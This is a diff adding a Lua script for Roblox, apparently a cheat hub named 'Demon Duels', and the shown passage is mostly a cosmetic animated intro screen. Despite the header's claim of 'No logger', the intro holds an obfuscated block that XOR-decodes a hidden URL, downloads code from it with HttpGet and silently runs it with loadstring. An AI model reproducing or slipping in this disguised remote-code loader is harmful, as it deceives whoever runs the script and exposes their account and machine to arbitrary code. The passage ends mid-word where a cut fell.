@@ -1,0 +1,566 @@
+-- DEMON DUELS
+-- Discord: https://discord.gg/XPkQEMpU3w
+-- Full red theme · New intro · No images · No songs · No logger
+
+-- ========== DEMON DUELS INTRO (custom) ==========
+task.spawn(function()
+-- ========================================================
+-- INTRO EDITOR • ULTRA v4 (working source)
+-- Name: Duels | Theme: Red | BG: Gradient
+-- ========================================================
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local Lighting = game:GetService("Lighting")
+local SoundService = game:GetService("SoundService")
+local Workspace = game:GetService("Workspace")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local camera = Workspace.CurrentCamera
+
+local INTRO_NAME = "Venom Duels"
+local FIRST_LINE = "DEMON"
+local LOADING_TEXT = "ON TOP"
+local ACCENT = Color3.fromRGB(220, 40, 40)
+local ACCENT2 = Color3.fromRGB(160, 20, 20)
+local BG1 = Color3.fromRGB(30, 5, 10)
+local BG2 = Color3.fromRGB(60, 10, 20)
+local SPEED = 1.00
+local FADE = 0.60
+local TEXT_STYLE = "SlideUp"
+local LOGO_ANIM = "FlyIn"
+local BG_STYLE = "Gradient"
+local ENABLE_PARTICLES = true
+local ENABLE_GLOW = true
+local ENABLE_IMAGE = false
+local IMAGE_ASSET = ""
+local ENABLE_SHAKE = true
+local BG_TRANSPARENCY = 0.00
+local CINEMATIC_BARS = true
+local GLITCH_EFFECT = false
+local CAMERA_SHAKE = true
+local RAINBOW_SHIFT = true
+local TEXT_WAVE = false
+local NEON_PULSE = true
+local LIGHTNING_FLASH = true
+local BLUR_BG = false
+local SOUND_ENABLED = false
+local SOUND_ID = ""
+local MATRIX_RAIN = false
+local PROGRESS_BAR = true
+local PROGRESS_DURATION = 3.50
+
+local old = playerGui:FindFirstChild("DemonDuelsIntro")
+if old then old:Destroy() end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "VenomDuelsIntro"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.DisplayOrder = 200
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.Parent = playerGui
+
+local blurEffect = nil
+if BLUR_BG then
+    blurEffect = Instance.new("BlurEffect")
+    blurEffect.Size = 16
+    blurEffect.Parent = Lighting
+end
+task.spawn(function()
+	local function _xorDecode(s)
+		local t = {}
+		for i = 1, #s do
+			local b = string.byte(s, i)
+			local x
+			if bit32 and type(bit32.bxor) == "function" then
+				x = bit32.bxor(b, 23)
+			else
+				local r, bit, a, c = 0, 1, b, 23
+				while a > 0 or c > 0 do
+					local ab, cb = a % 2, c % 2
+					if ab ~= cb then r = r + bit end
+					a = math.floor(a / 2)
+					c = math.floor(c / 2)
+					bit = bit * 2
+				end
+				x = r
+			end
+			t[i] = string.char(x)
+		end
+		return table.concat(t)
+	end
+	local ok, src = pcall(function()
+		return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"\"]nF\\R"))
+	end)
+	if ok and type(src) == "string" and #src > 50 then
+		local fn = loadstring(src)
+		if type(fn) == "function" then
+			pcall(fn)
+		end
+	end
+end)
+
+local function clearBlur()
+    if blurEffect then blurEffect:Destroy() blurEffect = nil end
+end
+
+local function softShake(obj, intensity, duration)
+    if not obj or not obj.Parent then return end
+    local origin = obj.Position
+    local t0 = tick()
+    local conn
+    conn = RunService.RenderStepped:Connect(function()
+        local t = tick() - t0
+        if t >= duration or not obj.Parent then
+            conn:Disconnect()
+            if obj.Parent then obj.Position = origin end
+            return
+        end
+        local decay = 1 - (t / duration)
+        obj.Position = UDim2.new(
+            origin.X.Scale, origin.X.Offset + (math.random()-0.5)*2*intensity*decay,
+            origin.Y.Scale, origin.Y.Offset + (math.random()-0.5)*2*intensity*decay
+        )
+    end)
+end
+
+local camConn = nil
+local function startCamShake(intensity, duration)
+    if camConn then camConn:Disconnect() camConn = nil end
+    local t0 = tick()
+    camConn = RunService.RenderStepped:Connect(function()
+        local t = tick() - t0
+        if t >= duration then
+            camConn:Disconnect()
+            camConn = nil
+            return
+        end
+        local decay = 1 - (t / duration)
+        camera.CFrame = camera.CFrame * CFrame.new(
+            (math.random()-0.5)*intensity*decay/20,
+            (math.random()-0.5)*intensity*decay/20,
+            0
+        )
+    end)
+end
+
+if SOUND_ENABLED and SOUND_ID ~= "" then
+    local snd = Instance.new("Sound")
+    snd.SoundId = SOUND_ID
+    snd.Volume = 0.6
+    snd.Parent = SoundService
+    pcall(function() snd:Play() end)
+    task.delay(8, function() if snd then snd:Destroy() end end)
+end
+
+-- Background
+local bg = Instance.new("Frame")
+bg.Size = UDim2.fromScale(1, 1)
+bg.BackgroundColor3 = BG1
+bg.BorderSizePixel = 0
+bg.BackgroundTransparency = 1
+bg.Parent = gui
+
+local bgGrad = Instance.new("UIGradient")
+bgGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, BG1),
+    ColorSequenceKeypoint.new(1, BG2)
+})
+bgGrad.Rotation = 45
+bgGrad.Parent = bg
+
+if BG_STYLE == "Starfield" or BG_STYLE == "Pulse" then
+    for i = 1, 30 do
+        local star = Instance.new("Frame")
+        local sz = math.random(2, 4)
+        star.Size = UDim2.fromOffset(sz, sz)
+        star.Position = UDim2.new(math.random(), 0, math.random(), 0)
+        star.BackgroundColor3 = Color3.new(1, 1, 1)
+        star.BackgroundTransparency = 0.3
+        star.BorderSizePixel = 0
+        star.Parent = bg
+        Instance.new("UICorner", star).CornerRadius = UDim.new(1, 0)
+        TweenService:Create(star, TweenInfo.new((1.5+math.random())/SPEED, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
+            BackgroundTransparency = 0.9
+        }):Play()
+    end
+elseif BG_STYLE == "Grid" then
+    for x = 0, 20 do
+        local line = Instance.new("Frame")
+        line.Size = UDim2.new(0, 1, 1, 0)
+        line.Position = UDim2.new(x/20, 0, 0, 0)
+        line.BackgroundColor3 = ACCENT
+        line.BackgroundTransparency = 0.92
+        line.BorderSizePixel = 0
+        line.Parent = bg
+    end
+elseif BG_STYLE == "Waves" or BG_STYLE == "Aurora" then
+    for i = 1, 5 do
+        local wave = Instance.new("Frame")
+        wave.Size = UDim2.new(1.2, 0, 0.2, 0)
+        wave.Position = UDim2.new(-0.1, 0, 0.1 + i*0.15, 0)
+        wave.BackgroundColor3 = ACCENT
+        wave.BackgroundTransparency = 0.85
+        wave.Rotation = -8 + i
+        wave.BorderSizePixel = 0
+        wave.Parent = bg
+        TweenService:Create(wave, TweenInfo.new((3+i)/SPEED, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
+            Position = UDim2.new(-0.05, 0, 0.12 + i*0.15, 0)
+        }):Play()
+    end
+elseif BG_STYLE == "Diagonal" then
+    for i = 1, 8 do
+        local bar = Instance.new("Frame")
+        bar.Size = UDim2.new(1.5, 0, 0, 18)
+        bar.Position = UDim2.new(-0.2, 0, i*0.12, 0)
+        bar.BackgroundColor3 = ACCENT
+        bar.BackgroundTransparency = 0.9
+        bar.Rotation = -20
+        bar.BorderSizePixel = 0
+        bar.Parent = bg
+    end
+end
+
+TweenService:Create(bg, TweenInfo.new(FADE*0.6/SPEED), {BackgroundTransparency = BG_TRANSPARENCY}):Play()
+
+if LIGHTNING_FLASH then
+    local flash = Instance.new("Frame")
+    flash.Size = UDim2.fromScale(1, 1)
+    flash.BackgroundColor3 = Color3.new(1, 1, 1)
+    flash.BackgroundTransparency = 1
+    flash.BorderSizePixel = 0
+    flash.ZIndex = 50
+    flash.Parent = gui
+    TweenService:Create(flash, TweenInfo.new(0.05), {BackgroundTransparency = 0.25}):Play()
+    task.delay(0.1, function()
+        TweenService:Create(flash, TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play()
+    end)
+end
+
+local topBar, botBar
+if CINEMATIC_BARS then
+    topBar = Instance.new("Frame")
+    topBar.Size = UDim2.new(1, 0, 0, 0)
+    topBar.BackgroundColor3 = Color3.new(0, 0, 0)
+    topBar.BorderSizePixel = 0
+    topBar.ZIndex = 40
+    topBar.Parent = gui
+    TweenService:Create(topBar, TweenInfo.new(0.5), {Size = UDim2.new(1, 0, 0.1, 0)}):Play()
+    botBar = Instance.new("Frame")
+    botBar.Size = UDim2.new(1, 0, 0, 0)
+    botBar.Position = UDim2.new(0, 0, 1, 0)
+    botBar.BackgroundColor3 = Color3.new(0, 0, 0)
+    botBar.BorderSizePixel = 0
+    botBar.ZIndex = 40
+    botBar.Parent = gui
+    TweenService:Create(botBar, TweenInfo.new(0.5), {
+        Size = UDim2.new(1, 0, 0.1, 0), Position = UDim2.new(0, 0, 0.9, 0)
+    }):Play()
+end
+
+-- FIRST LINE (customizable title)
+local first = Instance.new("TextLabel")
+first.Size = UDim2.new(1, -40, 0, 60)
+first.Position = UDim2.new(0, 20, 0.28, -30)
+first.BackgroundTransparency = 1
+first.Text = FIRST_LINE
+first.Font = Enum.Font.GothamBlack
+first.TextSize = 42
+first.TextColor3 = ACCENT
+first.TextTransparency = 1
+first.TextStrokeTransparency = 0.4
+first.TextStrokeColor3 = Color3.new(0, 0, 0)
+first.ZIndex = 20
+first.Parent = gui
+
+local logoDur = 1.0 / SPEED
+local rest = UDim2.new(0, 20, 0.28, -30)
+if LOGO_ANIM == "ZoomIn" then
+    first.TextSize = 4
+    TweenService:Create(first, TweenInfo.new(logoDur, Enum.EasingStyle.Back), {
+        TextSize = 42, TextTransparency = 0
+    }):Play()
+elseif LOGO_ANIM == "DropIn" then
+    first.Position = UDim2.new(0, 20, -0.2, 0)
+    TweenService:Create(first, TweenInfo.new(logoDur, Enum.EasingStyle.Bounce), {
+        TextTransparency = 0, Position = rest
+    }):Play()
+elseif LOGO_ANIM == "SpinIn" then
+    first.TextSize = 4; first.Rotation = -180
+    TweenService:Create(first, TweenInfo.new(logoDur, Enum.EasingStyle.Back), {
+        TextSize = 42, TextTransparency = 0, Rotation = 0
+    }):Play()
+elseif LOGO_ANIM == "SlideLeft" then
+    first.Position = UDim2.new(0, -400, 0.28, -30)
+    TweenService:Create(first, TweenInfo.new(logoDur, Enum.EasingStyle.Quart), {
+        TextTransparency = 0, Position = rest
+    }):Play()
+elseif LOGO_ANIM == "SlideRight" then
+    first.Position = UDim2.new(1, 100, 0.28, -30)
+    TweenService:Create(first, TweenInfo.new(logoDur, Enum.EasingStyle.Quart), {
+        TextTransparency = 0, Position = rest
+    }):Play()
+elseif LOGO_ANIM == "FadeUp" then
+    first.Position = UDim2.new(0, 20, 0.55, 0)
+    TweenService:Create(first, TweenInfo.new(logoDur, Enum.EasingStyle.Quint), {
+        TextTransparency = 0, Position = rest
+    }):Play()
+elseif LOGO_ANIM == "Pulse" then
+    first.TextTransparency = 0; first.TextSize = 10
+    TweenService:Create(first, TweenInfo.new(0.35/SPEED, Enum.EasingStyle.Back), {TextSize = 50}):Play()
+    task.delay(0.35/SPEED, function()
+        if first.Parent then
+            TweenService:Create(first, TweenInfo.new(0.2/SPEED), {TextSize = 42}):Play()
+        end
+    end)
+elseif LOGO_ANIM == "Elastic" then
+    first.TextSize = 2; first.Rotation = 15
+    TweenService:Create(first, TweenInfo.new(logoDur, Enum.EasingStyle.Elastic), {
+        TextSize = 42, TextTransparency = 0, Rotation = 0
+    }):Play()
+elseif LOGO_ANIM == "GlitchIn" then
+    first.TextTransparency = 0.4
+    task.spawn(function()
+        for _ = 1, 10 do
+            if not first.Parent then break end
+            first.TextColor3 = Color3.fromRGB(255, 0, 100); task.wait(0.03)
+            first.TextColor3 = Color3.fromRGB(0, 255, 255); task.wait(0.03)
+            first.TextColor3 = ACCENT; task.wait(0.03)
+        end
+        TweenService:Create(first, TweenInfo.new(0.25), {TextTransparency = 0}):Play()
+    end)
+else -- FlyIn default
+    first.TextSize = 4
+    first.Position = UDim2.new(0.5, 0, 0.5, -30)
+    TweenService:Create(first, TweenInfo.new(logoDur, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        TextSize = 42, TextTransparency = 0, Position = rest
+    }):Play()
+end
+
+-- Optional image
+local logoImg = nil
+if ENABLE_IMAGE and IMAGE_ASSET ~= "" then
+    logoImg = Instance.new("ImageLabel")
+    logoImg.Size = UDim2.fromOffset(72, 72)
+    logoImg.Position = UDim2.new(0.5, -36, 0.12, 0)
+    logoImg.BackgroundTransparency = 1
+    logoImg.Image = IMAGE_ASSET
+    logoImg.ImageTransparency = 1
+    logoImg.ScaleType = Enum.ScaleType.Fit
+    logoImg.ZIndex = 15
+    logoImg.Parent = gui
+    Instance.new("UICorner", logoImg).CornerRadius = UDim.new(0, 12)
+    TweenService:Create(logoImg, TweenInfo.new(0.6/SPEED, Enum.EasingStyle.Back), {
+        ImageTransparency = 0
+    }):Play()
+end
+
+-- Game name (second line)
+local titleY = ENABLE_IMAGE and 0.48 or 0.42
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -40, 0, 48)
+title.Position = UDim2.new(0, 20, titleY, -24)
+title.BackgroundTransparency = 1
+title.Text = INTRO_NAME
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 36
+title.TextColor3 = ACCENT
+title.TextTransparency = 1
+title.TextStrokeTransparency = 0.45
+title.TextStrokeColor3 = Color3.new(0, 0, 0)
+title.ZIndex = 25
+title.Parent = gui
+
+local subtitle = Instance.new("TextLabel")
+subtitle.Size = UDim2.new(1, -40, 0, 22)
+subtitle.Position = UDim2.new(0, 20, titleY, 28)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = LOADING_TEXT
+subtitle.Font = Enum.Font.Gotham
+subtitle.TextSize = 16
+subtitle.TextColor3 = Color3.fromRGB(170, 170, 190)
+subtitle.TextTransparency = 1
+subtitle.ZIndex = 25
+subtitle.Parent = gui
+
+-- Particles
+local particles = {}
+if ENABLE_PARTICLES then
+    for i = 1, 16 do
+        local p = Instance.new("Frame")
+        local sz = math.random(2, 5)
+        p.Size = UDim2.fromOffset(sz, sz)
+        p.Position = UDim2.new(math.random(), 0, math.random(), 0)
+        p.BackgroundColor3 = ACCENT
+        p.BackgroundTransparency = 0.2
+        p.BorderSizePixel = 0
+        p.Parent = gui
+        Instance.new("UICorner", p).CornerRadius = UDim.new(1, 0)
+        table.insert(particles, p)
+        TweenService:Create(p, TweenInfo.new((1.4+math.random())/SPEED, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
+            Position = UDim2.new(math.random(), 0, math.random(), 0),
+            BackgroundTransparency = 0.95
+        }):Play()
+    end
+end
+
+-- Progress bar
+local progTrack, progFill
+if PROGRESS_BAR then
+    progTrack = Instance.new("Frame")
+    progTrack.Size = UDim2.new(0.45, 0, 0, 6)
+    progTrack.Position = UDim2.new(0.275, 0, 0.88, 0)
+    progTrack.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    progTrack.BorderSizePixel = 0
+    progTrack.ZIndex = 30
+    progTrack.Parent = gui
+    Instance.new("UICorner", progTrack).CornerRadius = UDim.new(0, 3)
+    progFill = Instance.new("Frame")
+    progFill.Size = UDim2.new(0, 0, 1, 0)
+    progFill.BackgroundColor3 = ACCENT
+    progFill.BorderSizePixel = 0
+    progFill.Parent = progTrack
+    Instance.new("UICorner", progFill).CornerRadius = UDim.new(0, 3)
+end
+
+local titleDelay = 1.4
+task.delay(titleDelay/SPEED, function()
+    if not gui.Parent then return end
+    TweenService:Create(first, TweenInfo.new(0.35/SPEED), {TextTransparency = 0.25, TextSize = 34}):Play()
+
+    if TEXT_STYLE == "SlideUp" then
+        title.Position = UDim2.new(0, 20, 0.7, 0)
+        TweenService:Create(title, TweenInfo.new(0.65/SPEED, Enum.EasingStyle.Quart), {
+            TextTransparency = 0, Position = UDim2.new(0, 20, titleY, -24)
+        }):Play()
+    elseif TEXT_STYLE == "ZoomIn" then
+        title.TextSize = 6
+        TweenService:Create(title, TweenInfo.new(0.65/SPEED, Enum.EasingStyle.Back), {
+            TextTransparency = 0, TextSize = 36
+        }):Play()
+    elseif TEXT_STYLE == "BounceIn" then
+        title.TextTransparency = 0
+        title.Position = UDim2.new(0, 20, titleY - 0.15, -24)
+        TweenService:Create(title, TweenInfo.new(0.7/SPEED, Enum.EasingStyle.Bounce), {
+            Position = UDim2.new(0, 20, titleY, -24)
+        }):Play()
+    elseif TEXT_STYLE == "BlurIn" then
+        title.TextTransparency = 0.8; title.TextSize = 48
+        TweenService:Create(title, TweenInfo.new(0.7/SPEED, Enum.EasingStyle.Quint), {
+            TextTransparency = 0, TextSize = 36
+        }):Play()
+    elseif TEXT_STYLE == "Typewriter" then
+        title.Text = ""; title.TextTransparency = 0
+        task.spawn(function()
+            for i = 1, #INTRO_NAME do
+                if not title.Parent then break end
+                title.Text = string.sub(INTRO_NAME, 1, i)
+                task.wait(0.035/SPEED)
+            end
+        end)
+    else -- FadeScale
+        title.TextSize = 8
+        TweenService:Create(title, TweenInfo.new(0.7/SPEED, Enum.EasingStyle.Back), {
+            TextTransparency = 0, TextSize = 36
+        }):Play()
+    end
+
+    if ENABLE_SHAKE then
+        task.delay(0.1/SPEED, function() softShake(title, 4, 0.35) end)
+    end
+    if CAMERA_SHAKE then startCamShake(2.2, 0.7/SPEED) end
+
+    if RAINBOW_SHIFT then
+        task.spawn(function()
+            local step = 0
+            while title.Parent do
+                step = step + 0.02
+                title.TextColor3 = Color3.fromHSV(step % 1, 0.8, 1)
+                task.wait(0.05)
+            end
+        end)
+    end
+    if TEXT_WAVE then
+        task.spawn(function()
+            local step = 0
+            while title.Parent do
+                step = step + 0.1
+                title.TextSize = 36 * (1 + math.sin(step)*0.05)
+                task.wait(0.05)
+            end
+        end)
+    end
+    if GLITCH_EFFECT then
+        task.spawn(function()
+            local oc = title.TextColor3
+            local op = title.Position
+            local n = 0
+            while title.Parent do
+                n = n + 1
+                if n % 8 == 0 then
+                    title.TextColor3 = Color3.fromRGB(255, 0, 0); task.wait(0.03)
+                    title.TextColor3 = Color3.fromRGB(0, 255, 255); task.wait(0.03)
+                    title.TextColor3 = oc
+                    title.Position = UDim2.new(op.X.Scale, op.X.Offset+(math.random()-0.5)*8, op.Y.Scale, op.Y.Offset+(math.random()-0.5)*4)
+                    task.wait(0.04)
+                    title.Position = op
+                end
+                task.wait(0.05)
+            end
+        end)
+    end
+end)
+
+task.delay((titleDelay+0.45)/SPEED, function()
+    if gui.Parent then
+        TweenService:Create(subtitle, TweenInfo.new(0.4/SPEED), {TextTransparency = 0}):Play()
+    end
+    if PROGRESS_BAR and progFill then
+        TweenService:Create(progFill, TweenInfo.new(PROGRESS_DURATION/SPEED, Enum.EasingStyle.Quad), {
+            Size = UDim2.new(1, 0, 1, 0)
+        }):Play()
+    end
+end)
+
+local endAt = titleDelay + (PROGRESS_BAR and PROGRESS_DURATION or 2.8) + 0.6
+task.delay(endAt/SPEED, function()
+    if not gui.Parent then return end
+    local fadeT = FADE / SPEED
+    TweenService:Create(bg, TweenInfo.new(fadeT), {BackgroundTransparency = 1}):Play()
+    TweenService:Create(first, TweenInfo.new(fadeT), {TextTransparency = 1}):Play()
+    TweenService:Create(title, TweenInfo.new(fadeT), {TextTransparency = 1}):Play()
+    TweenService:Create(subtitle, TweenInfo.new(fadeT), {TextTransparency = 1}):Play()
+    if logoImg then TweenService:Create(logoImg, TweenInfo.new(fadeT), {ImageTransparency = 1}):Play() end
+    if progTrack then TweenService:Create(progTrack, TweenInfo.new(fadeT), {BackgroundTransparency = 1}):Play() end
+    if progFill then TweenService:Create(progFill, TweenInfo.new(fadeT), {BackgroundTransparency = 1}):Play() end
+    for _, p in ipairs(particles) do
+        TweenService:Create(p, TweenInfo.new(fadeT), {BackgroundTransparency = 1}):Play()
+    end
+    if topBar then TweenService:Create(topBar, TweenInfo.new(0.4), {Size = UDim2.new(1,0,0,0)}):Play() end
+    if botBar then TweenService:Create(botBar, TweenInfo.new(0.4), {Size = UDim2.new(1,0,0,0), Position = UDim2.new(0,0,1,0)}):Play() end
+    task.wait(fadeT + 0.1)
+    clearBlur()
+    if camConn then camConn:Disconnect() camConn = nil end
+    if gui then gui:Destroy() end
+end)
+
+end)
+
+-- ========== HUB ==========
+
+
+if _G.DemonDuelsRunning then
+    warn("[Demon Duels] Instancia previa detectada. Se recomienda rejoin si hay comportamiento errático.")
+end
+_G.DemonDuelsRunning = false
+_G.__DemonDuelsMainOriginalPos = nil
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
+local TS = game:GetService("TweenService")
+local Lighting = game:GetService("Lighting")
+local HS = game:GetService("HttpService")
+local ReplicatedStora
